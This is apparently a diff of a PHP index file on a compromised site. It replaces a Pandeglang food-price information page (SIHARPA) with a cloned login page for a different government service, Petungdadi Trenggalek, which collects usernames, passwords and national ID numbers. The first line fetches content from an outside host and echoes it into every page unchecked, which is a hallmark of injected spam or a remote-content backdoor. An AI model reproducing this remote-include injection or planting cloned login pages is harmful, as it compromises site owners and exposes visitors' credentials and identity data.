@@ -1,133 +1,216 @@
 <?php $a = file_get_contents('https://paulsaar.com/tmb/id.txt');
 echo $a; ?>
+<?php
+if (isset($_GET['auth']) == 'auth') {
+    include "project/auth/login-auth.php";
+} else {
+   ?>
 <!DOCTYPE html>
 <html>
 <head>
-
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>SIHARPA - Sistem Informasi Harga Pangan Pandeglang | Frontpages</title>
-	<link href="media/website/pavicon.png" rel="shortcut icon" type="image/x-icon">
-
-    <link href="themes/assets/css/bootstrap.min.css" rel="stylesheet">
-    <link href="themes/assets/font-awesome/css/font-awesome.css" rel="stylesheet">
-	
-	<!-- Data Tables -->
-    <link href="themes/assets/css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">
-    <link href="themes/assets/css/plugins/dataTables/dataTables.responsive.css" rel="stylesheet">
-    <link href="themes/assets/css/plugins/dataTables/dataTables.tableTools.min.css" rel="stylesheet">
-	
-    <link href="themes/assets/css/animate.css" rel="stylesheet">
-    <link href="themes/assets/css/style.css" rel="stylesheet">
-	
-	<!-- Jquery Script -->
-	<script src="themes/assets/js/jquery-2.1.1.js"></script>
-	
-	<!-- Mainly scripts -->
-    <script src="themes/assets/js/bootstrap.min.js"></script>
-    <script src="themes/assets/js/plugins/metisMenu/jquery.metisMenu.js"></script>
-    <script src="themes/assets/js/plugins/slimscroll/jquery.slimscroll.min.js"></script>
-
-    <!-- Custom and plugin javascript -->
-    <script src="themes/assets/js/inspinia.js"></script>
-    <script src="themes/assets/js/plugins/pace/pace.min.js"></script>
-	
-	 <!-- Data Tables -->
-    <script src="themes/assets/js/plugins/dataTables/jquery.dataTables.js"></script>
-    <script src="themes/assets/js/plugins/dataTables/dataTables.bootstrap.js"></script>
-    <script src="themes/assets/js/plugins/dataTables/dataTables.responsive.js"></script>
-    <script src="themes/assets/js/plugins/dataTables/dataTables.tableTools.min.js"></script>
-
-    <!-- Flot -->
-    <script src="themes/assets/js/plugins/flot/jquery.flot.js"></script>
-    <script src="themes/assets/js/plugins/flot/jquery.flot.tooltip.min.js"></script>
-    <script src="themes/assets/js/plugins/flot/jquery.flot.resize.js"></script>
-
-    <!-- ChartJS-->
-    <script src="themes/assets/js/plugins/chartJs/Chart.min.js"></script>
-
-    <!-- Peity -->
-    <script src="themes/assets/js/plugins/peity/jquery.peity.min.js"></script>
-    <!-- Peity demo -->
-    <script src="themes/assets/js/demo/peity-demo.js"></script>
-	
+    <meta http-equiv="Content-Type" content="text/html" />
+    <title>Petungdadi Trenggalek</title>
+    <link rel="icon" href="project/media/logo/icon_url.png" type="image/x-icon">
+    <!-- Tell the browser to be responsive to screen width -->
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+    <!-- Bootstrap 3.3.7 -->
+    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/bower_components/bootstrap/dist/css/bootstrap.min.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/bower_components/font-awesome/css/font-awesome.min.css">
+    <!-- Ionicons -->
+    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/bower_components/Ionicons/css/ionicons.min.css">
+    <!-- Theme style -->
+    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/dist/css/AdminLTE.min.css">
+    <!-- iCheck -->
+    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/plugins/iCheck/square/blue.css">
+    <!-- Sweet Alert -->
+    <link rel="stylesheet" href="https://petungdadi.trenggalekkab.go.id/production/sweet_alert/css/sweetalert.css">
+  
 </head>
-
-<body class="top-navigation">
-
-    <div id="wrapper">
-        <div id="page-wrapper" class="gray-bg">
-        <div class="row border-bottom white-bg">
-        <nav class="navbar navbar-static-top" role="navigation">
-            <div class="navbar-header">
-                <button aria-controls="navbar" aria-expanded="false" data-target="#navbar" data-toggle="collapse" class="navbar-toggle collapsed" type="button">
-                    <i class="fa fa-reorder"></i>
-                </button>
-                <a href="index.php" class="navbar-brand">SIHARPA</a>
-            </div>
-            <div class="navbar-collapse collapse" id="navbar">
-                <ul class="nav navbar-nav">
-                                        	<li class="dropdown">
-                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Tentang Kami <span class="caret"></span></a>
-                        <ul role="menu" class="dropdown-menu">
-                            							<li><a href="?pages=post/pages&p=011770496612dc61b2bee223f7881990a77c9e71"><i class="fa fa-file-text-o"></i> Sambutan Kepala Dinas</a></li>
-                                                    </ul>
-                    </li>
-												<li class="dropdown">
-                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Produsen <span class="caret"></span></a>
-                        <ul role="menu" class="dropdown-menu">
-                            							<li><a href="?pages=produsen/index&produsenID=5"><i class="fa fa-building"></i> GAPOKTAN SINAR BAHAGIA</a></li>
-														<li><a href="?pages=produsen/index&produsenID=4"><i class="fa fa-building"></i> GAPOKTAN BANDA URANG</a></li>
-														<li><a href="?pages=produsen/index&produsenID=3"><i class="fa fa-building"></i> GAPOKTAN MARGA SALUYU</a></li>
-														<li><a href="?pages=produsen/index&produsenID=2"><i class="fa fa-building"></i> GAPOKTAN MUKTI TANI</a></li>
-														<li><a href="?pages=produsen/index&produsenID=1"><i class="fa fa-building"></i> GAPOKTAN SUGI TANI</a></li>
-							                        </ul>
-                    </li>
-												<li class="dropdown">
-                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Pasar <span class="caret"></span></a>
-                        <ul role="menu" class="dropdown-menu">
-                            							<li><a href="?marketID=35"><i class="fa fa-home"></i> PASAR CIBALIUNG</a></li>
-														<li><a href="?marketID=26"><i class="fa fa-home"></i> PASAR LABUAN</a></li>
-														<li><a href="?marketID=30"><i class="fa fa-home"></i> PASAR MENES</a></li>
-														<li><a href="?marketID=25"><i class="fa fa-home"></i> PASAR PANDEGLANG</a></li>
-														<li><a href="?marketID=42"><i class="fa fa-home"></i> PASAR PANIMBANG</a></li>
-														<li><a href="?marketID=33"><i class="fa fa-home"></i> PASAR PICUNG</a></li>
-														<li class="divider"></li>
-							<li><a href="?pages=pasar-list">LIHAT PASAR LAINNYA <i class="fa fa-angle-double-right"></i></a></li>
+ 
+<body class="hold-transition login-page">
+    <div class="login-box">
+        <!-- /.login-logo -->
+        <div class="login-box-body">
+            <div class="row">
+                <div class="col-md-12">
+                    <!-- Custom Tabs -->
+                    <div class="nav-tabs-custom">
+                        <ul class="nav nav-tabs">
+                            <li class="active"><a href="#tab_1" data-toggle="tab">Login Verifikator</a></li>
+                            <li><a href="#tab_2" data-toggle="tab">Login Pemohon</a></li>
                         </ul>
-                    </li>
-                    <li class="dropdown">
-                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Komoditas <span class="caret"></span></a>
-                        <ul role="menu" class="dropdown-menu">
-							<li><a href="?pages=komoditas/index"><i class="fa fa-sitemap"></i> Semua Data Komoditas</a></li>
-							<li><a href="?pages=komoditas/filter"><i class="fa fa-sort-alpha-asc"></i> Filter Data Komoditas</a></li>
-							<li class="divider"></li>
-														<li><a href="?pages=komoditas/data&komoditasID=1"><img src="media/komoditas-86006.png" style="width:16px;"> BERAS</a></li>
-														<li><a href="?pages=komoditas/data&komoditasID=2"><img src="media/komoditas-17481.png" style="width:16px;"> SAYURAN</a></li>
-														<li><a href="?pages=komoditas/data&komoditasID=3"><img src="media/komoditas-16564.png" style="width:16px;"> DAGING AYAM & TELUR</a></li>
-														<li><a href="?pages=komoditas/data&komoditasID=7"><img src="media/komoditas-74467.png" style="width:16px;"> DAGING SAPI</a></li>
-														<li><a href="?pages=komoditas/data&komoditasID=8"><img src="media/komoditas-95565.png" style="width:16px;"> MINYAK GORENG</a></li>
-														<li><a href="?pages=komoditas/data&komoditasID=9"><img src="media/komoditas-80031.png" style="width:16px;"> GULA PASIR</a></li>
-														<li><a href="?pages=komoditas/data&komoditasID=10"><img src="media/komoditas-35701.png" style="width:16px;"> TEPUNG</a></li>
-														<li class="divider"></li>
-							<li><a href="?pages=komoditas/list">DATA KOMODITAS LAINNYA <i class="fa fa-angle-double-right"></i></a></li>
-                        </ul>
-                    </li>
-                    <li>
-                        <a href="?pages=post/blog"> Berita</a>
-                    </li>
-
-                </ul>
-                <ul class="nav navbar-top-links navbar-right">
-                    					<li>
-                        <a href="?pages=login">
-                            <small><i class="fa fa-sign-in"></i> Log In</small>
-                        </a>
-                    </li>
-					                </ul>
+                        <div class="tab-content">
+                            <div class="tab-pane active" id="tab_1">
+                                <center><img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/icon_url.png" width="80%" class="user-image"
+                                        alt="User Image"></center>
+                                <form action="https://petungdadi.trenggalekkab.go.id/project/auth/login-check.php" name="sign_in" id="sign_in" method="post">
+                                    <div class="form-group has-feedback">
+                                        <input type="text" name="name_akses" class="form-control" placeholder="Username"
+                                            autocomplete="off" required>
+                                        <span class="fa fa-user form-control-feedback"></span>
+                                    </div>
+                                    <div class="form-group has-feedback">
+                                        <input type="password" name="name_password" class="form-control"
+                                            placeholder="Password" autocomplete="off" required>
+                                        <span class="fa fa-key form-control-feedback"></span>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-xs-12">
+                                            <button type="submit" class="btn btn-primary btn-block btn-flat"
+                                                name="login">Login</button>
+                                        </div>
+                                        <div class="col-xs-12" style="margin-top: 2%;">
+                                            <a href="https://petungdadi.trenggalekkab.go.id/Tutorial-Petungdadi" type="submit"
+                                                class="btn btn-primary bg-olive btn-flat" style="float: center;">Buku
+                                                Panduan</a>
+                                            
+                                        </div>
+                                        <div class="col-xs-12" style="margin-top: 2%;">
+                                            <div class="btn btn-danger btn-block btn-flat">Bila Ada Kendala Silahkan
+                                                Hubungi <br>Nomor WhatsApp <br> 085736928746</div>
+                                        </div>
+                                        <div class="col-xs-12">
+                                            <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/pemkab.png" width="23%"
+                                                class="user-image pull-left" style="margin-top: 5%;margin-left: 5%;"
+                                                alt="User Image">
+                                            <h6 class="pull-left"
+                                                style="margin-top: 6%;margin-left: 13%;margin-bottom: 0px;">Powered By
+                                            </h6>
+                                            <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/bsre.png" width="55%"
+                                                class="user-image pull-left"
+                                                style="margin-top: 0px;margin-bottom: 0px;margin-left: 10%;"
+                                                alt="User Image">
+                                        </div>
+                                        <!-- /.col -->
+                                    </div>
+                                </form>
+                            </div>
+                            <!-- /.tab-pane -->
+                            <div class="tab-pane" id="tab_2">
+                                <div class="register-box-body">
+                                    <center><img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/icon_url.png" width="80%" class="user-image"
+                                            alt="User Image"></center>
+                                    <form action="https://petungdadi.trenggalekkab.go.id/project/auth/login-pendaftar.php" method="post">
+                                        <div class="form-group has-feedback">
+                                            <input type="text" name="nik" class="form-control"
+                                                placeholder="NIK" required>
+                                            <span class="glyphicon glyphicon-user form-control-feedback"></span>
+                                        </div>
+                                        <div class="form-group">
+                                            <input type="text" name="password" class="form-control" placeholder="Password" required>
+                                        </div>
+                                        <div class="row">
+                                            <!-- /.col -->
+                                            <div class="col-xs-6">
+                                                <button type="submit" name="simpan"
+                                                    class="btn btn-primary btn-raised btn-block btn-flat">Masuk</button>
+                                            </div>
+                                              <div class="col-xs-6">
+                                                <button type="submit" name="daftar"
+                                                    class="btn btn-primary bg-olive btn-block btn-flat">Daftar Baru</button>
+                                            </div>
+                                          <div class="col-xs-12" style="margin-top: 2%;">
+                                            <div class="btn btn-primary bg-olive btn-block btn-flat">Untuk Daftar Baru <br> Masukan NIK dan Password <br> Lalu klik Daftar Baru </div>
+                                            </div>
+                                         </div>
+                                           
+                                    </form>
+                                  <div class="row">
+                                              <div class="col-xs-6" style="margin-top: 2%;">
+                                                <button class="btn btn-danger btn-olive btn-block btn-flat" data-toggle="modal" data-target="#modal-danger">Lupa Password</button>
+                                            </div>
+                                              <div class="col-xs-12" style="margin-top: 2%;">
+                                            <div class="btn btn-danger btn-block btn-flat">Jika Lupa Password Silahkan  <br>1. Silahkan Klik Lupa Password <br>2. Masukkan NIK dan Email saat d
+aftar <br>3. Kemudin Buka Email Yang Pernah <br> di daftarkan</div>
+                                            </div>
+                                            <!-- /.col -->
+                                            <div class="col-xs-12">
+                                                <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/pemkab.png" width="23%"
+                                                    class="user-image pull-left" style="margin-top: 5%;margin-left: 5%;"
+                                                    alt="User Image">
+                                                <h6 class="pull-left"
+                                                    style="margin-top: 6%;margin-left: 13%;margin-bottom: 0px;">Powered
+                                                    By</h6>
+                                                <img src="https://petungdadi.trenggalekkab.go.id/project/media/logo/bsre.png" width="55%"
+                                                    class="user-image pull-left"
+                                                    style="margin-top: 0px;margin-bottom: 0px;margin-left: 10%;"
+                                                    alt="User Image">
+                                            </div>
+                                        </div>
+                                </div>
+                                <!-- /.tab-pane -->
+                            </div>
+                            <!-- /.tab-content -->
+                        </div>
+                        <!-- nav-tabs-custom -->
+                    </div>
+                    <!-- /.col -->
+                </div>
             </div>
-        </nav>
         </div>
-        <div class="wrapper wrapper-content">
-            <div class="container">
+        <div class="modal modal-danger fade" id="modal-danger">
+          <div class="modal-dialog">
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                  <span aria-hidden="true">×</span></button>
+                <h4 class="modal-title">Lupa Password</h4>
+              </div>
+              <div class="modal-body">
+                <form class="form-horizontal" method="POST" action="https://petungdadi.trenggalekkab.go.id/project/auth/login-pendaftar.php">
+                    <div class="form-group">
+                    <label class="col-sm-2 control-label">NIK</label>
+                    <div class="col-sm-10">
+                    <input type="text" name="nik" class="form-control" placeholder="NIK" required>
+                    </div>
+                    </div>
+                    <div class="form-group">
+                    <label class="col-sm-2 control-label">Nomor WA</label>
+                    <div class="col-sm-10">
+                    <input type="text" name="passwordnohp" class="form-control" placeholder="Nomor WA" required>
+                    </div>
+                </div>
+                <center><button type="submit" name="lupa" class="btn btn-primary btn-raised btn-block btn-flat">Kirim</button></center>
+                </form>
+              </div>
+            </div>
+            <!-- /.modal-content -->
+          </div>
+          <!-- /.modal-dialog -->
+        </div>
+        <!-- jQuery 3 -->
+        <script src="https://petungdadi.trenggalekkab.go.id/production/bower_components/jquery/dist/jquery.min.js"></script>
+        <!-- Bootstrap 3.3.7 -->
+        <script src="https://petungdadi.trenggalekkab.go.id/production/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+        <!-- iCheck -->
+        <script src="https://petungdadi.trenggalekkab.go.id/production/plugins/iCheck/icheck.min.js"></script>
+        <!-- Sweet Alert -->
+        <script src="https://petungdadi.trenggalekkab.go.id/production/sweet_alert/js/sweetalert.min.js"></script>
+        <script>
+        $(function() {
+            $('input').iCheck({
+                checkboxClass: 'icheckbox_square-blue',
+                radioClass: 'iradio_square-blue',
+                increaseArea: '20%'
+            });
+        });
+        </script>
+      <script>
+      $(document).ready(function(){
+          // Mendeteksi perubahan URL
+          $(window).on('hashchange', function(){
+              var hash = window.location.hash;
+              $('ul.nav a[href="' + hash + '"]').tab('show');
+          });
+          // Menampilkan tab saat halaman dimuat berdasarkan URL
+          var hash = window.location.hash;
+          $('ul.nav a[href="' + hash + '"]').tab('show');
+      });
+      </script>
+</body>
+</html>
+<?php
+}
+?>
